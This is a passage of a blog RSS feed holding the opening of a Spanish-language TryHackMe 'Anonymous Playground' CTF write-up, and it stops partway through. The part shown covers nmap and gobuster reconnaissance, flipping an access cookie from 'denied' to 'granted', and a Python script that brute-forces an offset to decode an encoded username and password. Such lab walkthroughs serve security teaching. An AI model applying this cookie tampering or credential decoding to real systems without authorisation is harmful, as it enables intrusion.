&lt;span class=&#34;nv&#34;&gt;$secret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;68b329da98[... REDACTED ...]b9c940&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/harder/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/harder/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
            
              <category>gittools</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Anonymous Playground</title>
        <link>https://sckull.github.io/posts/anonymousplayground/</link>
        <pubDate>Mon, 17 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Mon, 17 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/anonymousplayground/</guid>
        <description>Anonymous Playground es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Anonymous Playground es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymousplayground/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Anonymous Playground&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Want to become part of Anonymous? They have a challenge for you. Can you get the flags and become an operative?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;190&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Dificil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/Nameless0ne&#34;&gt;Nameless0ne&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Aug 17 16:53:27 2020 as: nmap -Pn -sV -o mini_scan anonymous.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; anonymous.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.168.121&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Aug 17 16:54:24 2020 -- 1 IP address (1 host up) scanned in 57.27 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_14-56-54.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la pagina &lt;code&gt;Operatives&lt;/code&gt; se muestra una lista de posibles usuarios.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_14-59-54.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el codigo fuente de la imagen encontramos un comentario en el cual vemos una direccion de una pagina, dicha pagina no existe.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_14-57-54.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/anonymousplayground$ gobuster dir -u http://anonymous.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t &lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; -q -x php,html,txt
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En &lt;code&gt;robots.txt&lt;/code&gt; encontramos una direccion que al visitarla nos muestra un mensaje.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_15-03-01.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En esta ultima pagina encontramos un cookie el cual está configurado en &lt;code&gt;denied&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_15-16-51.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Le cambiamos el valor a &lt;code&gt;granted&lt;/code&gt; utilizando firefox.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_15-25-16.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Recargamos la pagina y ahora nos muestra el siguiente mensaje, al parecer es un mensaje codificado.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_15-26-19.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;magna---user&#34;&gt;MAGNA - USER&lt;/h2&gt;
&lt;p&gt;Intenamos con los diferentes bases y ciphers pero no logramos obtener ningun valor interesante, en la plataforma nos da una pista donde el valor &lt;strong&gt;zA&lt;/strong&gt; es &lt;strong&gt;a&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;You&lt;span class=&#34;s1&#34;&gt;&amp;#39;re going to want to write a Python script for this. &amp;#39;&lt;/span&gt;zA&lt;span class=&#34;s1&#34;&gt;&amp;#39; = &amp;#39;&lt;/span&gt;a&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Podemos ver que &lt;strong&gt;zA = a&lt;/strong&gt; eso quiere decir que cada par de letras tiene un valor, de tal forma que quedaria de la siguiente forma si reemplazamos &lt;strong&gt;zA&lt;/strong&gt;, pero solo tenemos el valor de &lt;strong&gt;a&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span class=&#34;gd&#34;&gt;- hE zA dC fH zA::hE zA dC fH zA hA iJ zA eI aD jB cB hH gA zA fH fN
&lt;/span&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+ hE a  dC fH a ::hE a  dC fH a  hA iJ a  eI aD jB cB hH gA a  fH fN
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;La cantidad de caracteres al decodificarlo quedaria de la siguiente forma &lt;strong&gt;5::17&lt;/strong&gt;. Los usuarios que encontramos ninguno de ellos tiene más de 17 caracteres pero si encontramos cuatro de ellos que tienen 5 caracteres (&lt;code&gt;[&#39;ninja&#39;, &#39;jammy&#39;, &#39;magna&#39;, &#39;skidy&#39;]&lt;/code&gt;) por lo que quizas la primera parte de la codificacion tenga uno de los usuarios y posiblemente la segunda, una contraseña.&lt;/p&gt;
&lt;p&gt;En la primera parte tenemos 5 caracteres para un &amp;ldquo;usuario&amp;rdquo;, segun la pista la primera parte tiene dos &lt;strong&gt;a&lt;/strong&gt; y entre los usuarios solo &lt;code&gt;magna&lt;/code&gt; tiene la misma letra en la misma posision, por lo que el valor &lt;code&gt;hE&lt;/code&gt; posiblemente pertenezca a &lt;code&gt;m&lt;/code&gt; y asi con los valores siguientes.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span class=&#34;gd&#34;&gt;- hE zA dC fH zA
&lt;/span&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+ hE a  dC fH a 
&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+ m  a  g  n  a
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Escribimos un pequeño script el cual utiliza un numero (n) para poder encontrar la letra &lt;code&gt;m&lt;/code&gt; (con &lt;code&gt;chr()&lt;/code&gt;), utilizando los valores unicode del par de letras (con &lt;code&gt;ord()&lt;/code&gt;), sumando el valor de cada uno de ellos y restando o sumando el numero (n).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&amp;gt;&amp;gt;&amp;gt; ord&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;h&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;104&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; ord&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;E&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;69&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#Valor Esperado con la &amp;#34;formula&amp;#34;&lt;/span&gt;
chr&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;104&lt;/span&gt; + &lt;span class=&#34;m&#34;&gt;69&lt;/span&gt; +/- n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Hay que tomar en cuenta que el valor &lt;code&gt;zA&lt;/code&gt; es &lt;code&gt;a&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python:AnonymousEncode.py&#34; data-lang=&#34;python:AnonymousEncode.py&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&amp;#34;Credentials&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;encoded_cred&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;hE zA dC fH zA&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;#USERS&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;users.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rstrip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;users&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lista&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lista&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;zA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;h&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;E&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;	
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;90&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
			&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Posible numero: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
